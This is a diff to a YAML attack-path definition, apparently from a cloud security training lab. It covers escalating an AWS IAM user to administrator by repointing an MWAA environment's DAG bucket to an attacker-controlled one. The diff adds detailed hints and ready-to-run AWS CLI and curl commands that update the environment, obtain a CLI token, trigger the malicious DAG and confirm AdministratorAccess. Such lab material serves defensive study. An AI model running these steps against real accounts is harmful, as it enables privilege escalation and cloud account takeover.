@@ -5,6 +5,8 @@ attackMap:
       type: principal
       subType: iam-user
       arn: "arn:aws:iam::{account_id}:user/pl-prod-mwaa-002-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
       description: >
         You have gained access to this principal's AWS IAM credentials. These could
         have been obtained through many real-world vectors: phishing a developer and
@@ -47,18 +49,20 @@ attackMap:
         S3 bucket containing a malicious DAG. Wait 10-30 minutes for the environment update
         to complete, then 60 seconds for DAG synchronization.
       hints:
-        - "You can modify the configuration of existing managed workflow environments."
-        - "Look for workflow environments that execute with privileged IAM roles."
-        - "Browse to https://pathfinding.cloud/paths/mwaa-002 for technique details."
+        - "Use airflow:GetEnvironment to inspect the target environment -- note the ExecutionRoleArn and the current SourceBucketArn."
+        - "You can change where MWAA looks for DAG files by updating the environment's source bucket configuration."
+        - "You need an S3 bucket that the execution role can read from. Its resource policy must allow the MWAA execution role to read objects."
+        - "Use airflow:UpdateEnvironment to change SourceBucketArn and DagS3Path to point to your attacker-controlled bucket."
+        - "After calling UpdateEnvironment, poll airflow:GetEnvironment until Status returns to AVAILABLE -- this takes 10-30 minutes."
+        - "Once the environment is AVAILABLE, wait an additional 60 seconds for MWAA to discover and parse DAGs from the new bucket location."
+        - "Browse to https://pathfinding.cloud/paths/mwaa-002 for full technique details."
       commands:
+        - description: "Inspect the MWAA environment to confirm its execution role and current DAG source"
+          command: "aws mwaa get-environment --name pl-prod-mwaa-002-to-admin-env --query 'Environment.{Status:Status,ExecutionRoleArn:ExecutionRoleArn,SourceBucketArn:SourceBucketArn,DagS3Path:DagS3Path}'"
         - description: "Update the MWAA environment to use the attacker's bucket"
-          command: "aws airflow update-environment --name pl-prod-mwaa-002-to-admin-env --source-bucket-arn arn:aws:s3:::pl-mwaa-002-attacker-bucket-{account_id}-{suffix} --dag-s3-path dags/"
-        - description: "Wait for the environment update to complete"
-          command: "aws airflow get-environment --name pl-prod-mwaa-002-to-admin-env --query 'Environment.Status' --output text"
-        - description: "Obtain a CLI token to trigger DAGs"
-          command: "aws airflow create-cli-token --name pl-prod-mwaa-002-to-admin-env"
-        - description: "Trigger the malicious DAG via the Airflow CLI API"
-          command: "curl -X POST 'https://{webserver-hostname}/aws_mwaa/cli' -H 'Authorization: Bearer {cli_token}' -H 'Content-Type: text/plain' -d 'dags trigger privesc_dag'"
+          command: "aws mwaa update-environment --name pl-prod-mwaa-002-to-admin-env --source-bucket-arn arn:aws:s3:::pl-mwaa-002-attacker-bucket-{account_id}-{suffix} --dag-s3-path dags/"
+        - description: "Poll until the environment returns to AVAILABLE state"
+          command: "aws mwaa get-environment --name pl-prod-mwaa-002-to-admin-env --query 'Environment.Status' --output text"
 
     - from: mwaa-environment
       to: target-role
@@ -67,6 +71,15 @@ attackMap:
         The malicious DAG executes within the MWAA environment using the admin execution
         role's credentials, attaching AdministratorAccess to the starting user.
       hints:
-        - "This environment's source bucket can be changed to any S3 bucket the execution role can read."
-        - "After the update, any DAG in the new bucket will run with the execution role's permissions."
-      commands: []
+        - "Once the environment is updated, use airflow:CreateCliToken to obtain a short-lived token for the Airflow web server API."
+        - "The Airflow CLI API endpoint is https://{webserver-hostname}/aws_mwaa/cli -- use the CLI token as a Bearer token to trigger DAGs."
+        - "Trigger the malicious DAG using the dags trigger command via the Airflow CLI API. The DAG will execute as the admin execution role."
+        - "After triggering the DAG, wait ~30 seconds for execution to complete and for IAM policy changes to propagate."
+        - "Use iam:ListAttachedUserPolicies on the starting user to verify that AdministratorAccess has been attached."
+      commands:
+        - description: "Obtain a CLI token to access the Airflow API"
+          command: "aws mwaa create-cli-token --name pl-prod-mwaa-002-to-admin-env"
+        - description: "Trigger the malicious DAG via the Airflow CLI API"
+          command: "curl -X POST 'https://{webserver-hostname}/aws_mwaa/cli' -H 'Authorization: Bearer {cli_token}' -H 'Content-Type: text/plain' -d 'dags trigger privesc_dag' | base64 -d"
+        - description: "Verify that AdministratorAccess was attached to the starting user"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-mwaa-002-to-admin-starting-user --query 'AttachedPolicies[*].PolicyArn' --output text"
